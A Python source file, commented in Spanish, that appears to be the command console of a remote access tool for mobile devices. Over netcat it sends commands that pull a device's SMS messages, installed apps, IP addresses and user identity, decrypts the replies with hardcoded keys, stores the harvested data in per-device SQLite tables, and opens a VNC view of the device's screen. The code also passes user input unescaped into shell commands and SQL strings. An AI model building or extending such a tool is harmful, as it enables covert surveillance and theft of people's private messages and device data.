import subprocess
import re
import threading
#from views.indexView.db.script import insertRow
from db.script import InsertDataDevice, ReadTableDb, createTable
import readline
from jsonData.script import InsertUserInJson
from cliTest.decrypt import EncodeBase64, decrypt_message
from cliTest.autocomplete import autocompletado
from cliTest.ExecuteVnc import execute_vnc_viewer, usuario
from os import system

# Habilitar autocompletado
readline.parse_and_bind("tab: complete")
readline.set_completer(autocompletado)


def ClientSocketConnection(ipServer: str):
    server_address = ipServer
    server_port = 8080

    while True:
        try:
            color_azul_oscuro = "\033[34m"
            color_rojo = "\033[91m"
            color_rosa_neon = "\033[95;1m"
            color_blanco = "\033[97;1m"
            fin_color = "\033[0m"# Imprimir las IPs
            
            #Verificar si el servidor está activo
            command = f"echo 'ping' | nc {server_address} {server_port}"
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            responseServer = result.stdout.decode()

            if responseServer == "pong":
                print(f"conectado a: {ipServer}:{server_port}")
            else:
                print(f"Conexión fallida a: {ipServer}:{server_port}")
                break
            
            # Solicitar al usuario que ingrese un mensaje
            message = input(color_rojo + f"\n-> {color_blanco + usuario + fin_color}: " + fin_color)

            # Lanzar nc para enviar el mensaje y recibir la respuesta del servidor
            command = f"echo '{message}' | nc {server_address} {server_port}"
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            responseServer = result.stdout.decode()
            


            # Imprimir la respuesta del servidor
            #print(color_blanco + "Respuesta del servidor: " + color_blanco + color_rojo +  responseServer + color_blanco)

            if message == "exit":
                print("Saliendo del programa.")
                system("./bins/cleanProject.sh")
                break
            
            elif message == "getsms":
                messages = []
                pattern = r"Sender: (\d+), Message: (.+?),"
                matches = re.finditer(pattern, responseServer)
                
                for match in matches:
                    sender = match.group(1)
                    message = match.group(2)
                    messages.append({"Sender": sender, "Message": message})
                
                mensaje_rosa_neon = f"{color_rosa_neon}{messages}{fin_color}"

                print(mensaje_rosa_neon)
                continue
            
            elif message == "getapp":
                responseServer = decrypt_message(responseServer, "#VCVaOEA1ciQ3eCNFM3dTMg==")
                lista_apps = [app.strip() for app in responseServer[1:-1].split(",")]
                conteoApps = 0
                # Imprimir cada aplicación en una nueva línea
                for app in lista_apps:
                    conteoApps += 1
                    print(f"app ({conteoApps}): {app}")
                    
            elif message == "getip":
                responseServer = decrypt_message(responseServer, "WHpANlJ5MklEbSE3b1A4Sw==")
                ips_list = responseServer[1:-1].split(', ')

                ip_publica = ips_list[0]
                ip_privada = ips_list[1]

                # Imprimir las IPs
                print("IP Pública:", ip_publica)
                print("IP Privada:", ip_privada)
            
            elif message == "getuser":
                responseServer = decrypt_message(responseServer, "MiVhRkA2eklTZDhHIzlxWQ==")
                print(f"nombre usuario: {responseServer}")
                listUserName = responseServer.split(", ")
                nombre = listUserName[0]
                idDevice = listUserName[1]
                print(f"nombre: {nombre}")
                print(f"id Dispositivo: {idDevice}")
            
            elif message == "pushuser":
                
                responseServer = decrypt_message(responseServer, "KlM4I1E0dyQ3ZSVUMnVJVw==")
                pushDataDevice = responseServer.split(", ")
                idDevice = pushDataDevice[0]
                nameDevice = pushDataDevice[1]
                ip_publica = pushDataDevice[2].replace("[", "")
                ip_privada = pushDataDevice[3].replace("]", "")
                
                print(f"nombre: {nameDevice}")
                print(f"ip publica: {ip_publica}")
                print(f"ip privada: {ip_privada}")
                
                InsertDataDevice(
                    "db/dataDevices.db",
                    f"""
                    INSERT INTO info_devices (device, ip_publica, ip_privada)
	                    VALUES ("{nameDevice}", "{ip_publica}", "{ip_privada}")
                    
                    """
                                 
                )
                
                id_Device = ReadTableDb(
                    "db/dataDevices.db",
                    f"""
                    SELECT MAX(idDevice) FROM info_devices;
 
                    
                    """
                )
                
                print(f"id {id_Device[0][0]}")
                InsertUserInJson(nameDevice, int(id_Device[0][0]), "LogoPerfilHombre3.jpeg", "LogoPerfilHombre3.jpeg")
                
                
                
            elif message == "pushapp":
                
                responseServer = decrypt_message(responseServer, "NEBlI1M4ZiFHN3JXSzZ6UQ==")
                
                readIdDevice = ReadTableDb(
                        "db/dataDevices.db",
                        """
                        SELECT MAX(idDevice) FROM info_devices;
                        
                        """
                        
                        )
                readIdDevice = readIdDevice[0][0]
                
                createTable(
                    "db/appsDevices.db",
                    f"apps_device_{readIdDevice}",
                    f"""
                    CREATE TABLE "apps_device_{readIdDevice}" (
        	            "id_app"	INTEGER,
        	            "app"	TEXT,
        	            PRIMARY KEY("id_app" AUTOINCREMENT)
                    );
                    """
                    
                    )
                
                lista_apps = [app.strip() for app in responseServer[1:-1].split(",")]
                conteoApps = 0
                # Imprimir cada aplicación en una nueva línea
                for app in lista_apps:
                    conteoApps += 1
                    print(f"app ({conteoApps}): {app}")
                    
                    InsertDataDevice(
                        "db/appsDevices.db",
                        f"""
                        INSERT INTO apps_device_{readIdDevice} (app) 
                        	VALUES ("{app}")

                        """
                        
                    )
                    
                    
            elif message == "pushsms":
                messages = []

                readIdDevice = ReadTableDb(
                        "db/dataDevices.db",
                        """
                        SELECT MAX(idDevice) FROM info_devices;
                        
                        """
                        
                        )
                
                readIdDevice = readIdDevice[0][0]
                print(readIdDevice)
                
                createTable(
                    "db/smsDevices.db",
                    f"sms_device_{readIdDevice}",
                    f"""
                    CREATE TABLE "sms_device_{readIdDevice}" (
        	            "id_sms"	INTEGER,
        	            "sms"	TEXT,
        	            PRIMARY KEY("id_sms" AUTOINCREMENT)
                    );
                    """
                    
                    )
                
                
                pattern = r"Sender: (\d+), Message: (.+?),"
                matches = re.finditer(pattern, responseServer)
                
                for match in matches:
                    sender = match.group(1)
                    message = match.group(2)
                    messages.append({"Sender": sender, "Message": message})
                
                mensaje_rosa_neon = f"\n{color_rosa_neon}{messages}{fin_color}"
                
                
                listaSenders = []
                listaMessages = []
                
                for i  in  messages:
                    listaSenders.append(i['Sender'])

                for i  in  messages:
                    listaMessages.append(i['Message'])
 
                for senders, mess in zip(listaSenders, listaMessages):
                    print(f"{senders}: {mess}")                  
                    
                    InsertDataDevice(
                        "db/smsDevices.db",
                        f"""
                        INSERT INTO sms_device_{readIdDevice} (sms) 
                        	VALUES ("{senders}: {mess}")

                        """
                        
                    )
                    
                                  
            elif message == "getscreen":
                # Ejecutar vncviewer en un hilo separado
                screen_thread = threading.Thread(target=execute_vnc_viewer(ipServer))
                screen_thread.start()
                continue
            
            elif message == "clear":
                comando = "clear"
                subprocess.run(comando, shell=True)
                
                
            elif message == "test":
                #password_base64 = EncodeBase64(password6)
                #print(password_base64)

                decrypted_message = decrypt_message(responseServer, "#VCVaOEA1ciQ3eCNFM3dTMg==")
                print(decrypted_message)
                
        except Exception as e:
            print("Error:", e)

